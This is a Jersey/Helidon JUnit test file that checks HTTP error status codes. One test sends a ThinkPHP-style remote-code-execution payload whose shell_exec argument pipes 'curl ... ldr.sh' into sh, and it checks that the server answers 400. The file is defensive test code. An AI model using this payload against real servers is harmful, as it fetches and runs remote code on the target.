/*
 * Copyright (c) 2025 Oracle and/or its affiliates. All rights reserved.
 *
 * This program and the accompanying materials are made available under the
 * terms of the Eclipse Public License v. 2.0, which is available at
 * http://www.eclipse.org/legal/epl-2.0.
 *
 * This Source Code may also be made available under the following Secondary
 * Licenses when the conditions for such availability set forth in the
 * Eclipse Public License v. 2.0 are satisfied: GNU General Public License,
 * version 2 with the GNU Classpath Exception, which is available at
 * https://www.gnu.org/software/classpath/license.html.
 *
 * SPDX-License-Identifier: EPL-2.0 OR GPL-2.0 WITH Classpath-exception-2.0
 */

package org.glassfish.jersey.helidon;

import jakarta.ws.rs.GET;
import jakarta.ws.rs.Path;
import jakarta.ws.rs.PathParam;
import jakarta.ws.rs.WebApplicationException;
import jakarta.ws.rs.client.Client;
import jakarta.ws.rs.client.ClientBuilder;
import jakarta.ws.rs.client.WebTarget;
import jakarta.ws.rs.core.Response;
import org.apache.http.HttpHost;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClientBuilder;
import org.apache.http.message.BasicHttpRequest;
import org.junit.jupiter.api.Test;

import java.io.IOException;
import java.net.URI;

import static org.junit.jupiter.api.Assertions.assertEquals;

/**
 * @author Paul Sandoz
 */
public class ExceptionTest extends AbstractHelidonServerTester {
    @Path("{status}")
    public static class ExceptionResource {
        @GET
        public String get(@PathParam("status") int status) {
            throw new WebApplicationException(status);
        }

    }

    @Test
    public void test400StatusCodeForIllegalSymbolsInURI() throws IOException {
        startServer(ExceptionResource.class);
        URI testUri = getUri().build();
        String incorrectFragment = "/v1/abcdefgh/abcde/abcdef/abc/a/%3Fs=/Index/\\x5Cthink\\x5Capp/invokefunction"
                + "&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=curl+--user-agent+curl_tp5+http://127.0"
                + ".0.1/ldr.sh|sh";
        BasicHttpRequest request = new BasicHttpRequest("GET", testUri + incorrectFragment);
        CloseableHttpClient client = HttpClientBuilder.create().build();

        CloseableHttpResponse response = client.execute(new HttpHost(testUri.getHost(), testUri.getPort()), request);

        assertEquals(400, response.getStatusLine().getStatusCode());
    }

    @Test
    public void test400StatusCodeForIllegalHeaderValue() throws IOException {
        startServer(ExceptionResource.class);
        URI testUri = getUri().build();
        BasicHttpRequest request = new BasicHttpRequest("GET", testUri.toString() + "/400");
        request.addHeader("X-Forwarded-Host", "_foo.com");
        CloseableHttpClient client = HttpClientBuilder.create().build();

        CloseableHttpResponse response = client.execute(new HttpHost(testUri.getHost(), testUri.getPort()), request);

        assertEquals(400, response.getStatusLine().getStatusCode());
    }

    @Test
    public void test400StatusCode() throws IOException {
        startServer(ExceptionResource.class);
        Client client = ClientBuilder.newClient();
        WebTarget r = client.target(getUri().path("400").build());
        assertEquals(400, r.request().get(Response.class).getStatus());
    }

    @Test
    public void test500StatusCode() {
        startServer(ExceptionResource.class);
        Client client = ClientBuilder.newClient();
        WebTarget r = client.target(getUri().path("500").build());

        assertEquals(500, r.request().get(Response.class).getStatus());
    }
}
